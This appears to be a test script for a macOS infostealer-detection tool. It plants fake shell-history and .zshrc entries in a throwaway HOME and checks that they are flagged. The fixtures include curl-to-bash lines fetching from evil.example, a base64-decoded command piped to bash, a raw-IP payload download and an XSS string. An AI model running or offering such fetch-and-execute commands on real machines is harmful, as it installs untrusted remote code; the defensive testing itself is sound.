#!/bin/bash
# Plants harmless fake indicators in a throwaway HOME and checks they are flagged.
set -u
cd "$(dirname "$0")/.." || exit 2

FAKE=$(mktemp -d)
trap 'rm -rf "$FAKE"' EXIT

cat > "$FAKE/.zsh_history" <<'EOF'
: 1700000000:0;echo "Y3VybCBodHRwOi8vZXhhbXBsZS5jb20vYQ==" | base64 -d | bash
: 1700000001:0;curl -s http://203.0.113.7/payload -o /tmp/u && chmod +x /tmp/u
: 1700000002:0;curl -fsSL https://evil.example/fix.sh | bash
: 1700000003:0;curl -s https://evil.example/xss | bash # <script>alert(1)</script>
: 1700000004:0;/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
: 1700000005:0;ls -la
EOF
touch "$FAKE/.agent"
printf 'echo hi\n' > "$FAKE/.helper"; chmod +x "$FAKE/.helper"
printf 'alias ll="ls -l"\ncurl -s https://evil.example/x | sh\n' > "$FAKE/.zshrc"

REPORT="$FAKE/report.html"
out=$(HOME="$FAKE" ./mac-stealer-check.sh --quick --no-color --html "$REPORT" --no-open)
code=$?

fail=0
expect() {
  if printf '%s\n' "$out" | grep -qF -- "$1"; then echo "pass: $2"
  else echo "FAIL: $2 (expected to find: $1)"; fail=1; fi
}
reject() {
  if printf '%s\n' "$out" | grep -F -- "$1" | grep -q WARN; then echo "FAIL: $2"; fail=1
  else echo "pass: $2"; fi
}

expect '[WARN] echo "Y3VybCBodHRwOi8vZXhhbXBsZS5jb20vYQ==" | base64 -d' "base64 decode in history"
expect '[WARN] curl -s http://203.0.113.7/payload'                     "raw-IP download in history"
expect '[WARN] curl -fsSL https://evil.example/fix.sh | bash'           "unknown curl|bash in history"
expect '[INFO] Official installer one-liner: /bin/bash -c'              "Homebrew installer downgraded to INFO"
reject 'ls -la'                                                         "benign command not flagged"
expect "Known stealer artifact present: $FAKE/.agent"                   "AMOS ~/.agent artifact"
expect "Hidden file in a shared/home location: $FAKE/.helper"           "hidden executable in home"
expect '[WARN] .zshrc line 2:curl -s https://evil.example/x | sh'       "tampered .zshrc"
expect 'Needs your attention:'                                          "terminal summary recap"
if [ "$code" -eq 1 ]; then echo "pass: exit code 1 on warnings"
else echo "FAIL: exit code $code, expected 1"; fail=1; fi

if [ -s "$REPORT" ]; then echo "pass: HTML report created"
else echo "FAIL: HTML report missing or empty"; fail=1; fi

if grep -qF '&lt;script&gt;alert(1)&lt;/script&gt;' "$REPORT" && ! grep -qF '<script>alert(1)</script>' "$REPORT"; then
  echo "pass: HTML report escapes untrusted input"
else
  echo "FAIL: HTML escaping broken"; fail=1
fi

if grep -qF 'Needs your attention' "$REPORT" && grep -qF '</html>' "$REPORT"; then
  echo "pass: HTML report contains attention block and closing tag"
else
  echo "FAIL: HTML report missing expected structure"; fail=1
fi

if [ "$fail" -eq 0 ]; then echo "All tests passed."
else echo; echo "--- tool output ---"; echo "$out"; fi
exit "$fail"
